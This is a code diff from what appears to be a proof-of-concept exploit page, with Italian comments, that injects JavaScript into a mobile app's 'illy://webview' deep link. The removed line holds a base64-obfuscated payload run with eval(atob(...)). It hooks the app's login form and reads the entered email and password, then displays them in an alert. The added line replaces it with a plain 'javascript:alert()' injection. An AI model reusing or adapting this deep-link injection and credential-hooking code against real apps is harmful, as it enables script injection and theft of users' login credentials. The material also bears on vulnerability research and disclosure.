@@ -13,10 +13,9 @@
             // STEP 2: Iniezione del JS via Deep Link
             // Usiamo un delay leggermente più corto o più lungo a seconda del dispositivo
             setTimeout(function() {
-                var payload = "javascript:eval(atob('KGZ1bmN0aW9uKCl7dmFyIGk9c2V0SW50ZXJ2YWwoZnVuY3Rpb24oKXt2YXIgZj1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9jYWxBY2NvdW50Rm9ybScpO2lmKGYpe2NsZWFySW50ZXJ2YWwoaSk7Zi5vbnN1Ym1pdD1mdW5jdGlvbihlKXtlLnByZXZlbnREZWZhdWx0KCk7dmFyIGVtPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaWduSW5OYW1lJykudmFsdWU7dmFyIHB3PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZCcpLnZhbHVlO2FsZXJ0KCdQb0MgWFNTXG5FbWFpbDogJytlbSsnXG5QYXNzd29yZDogJytwdyk7fTthbGVydCgnWFNTIEhvb2tlZCcpO319LDUwMCk7fSkoKTs='));";
                 
                 // Spariamo il secondo Deep Link
-                window.location.href = "illy://webview?url=" + encodeURIComponent(payload);
+                window.location.href = "illy://webview?url=javascript:alert()";
             }, 2500); 
         }
     </script>
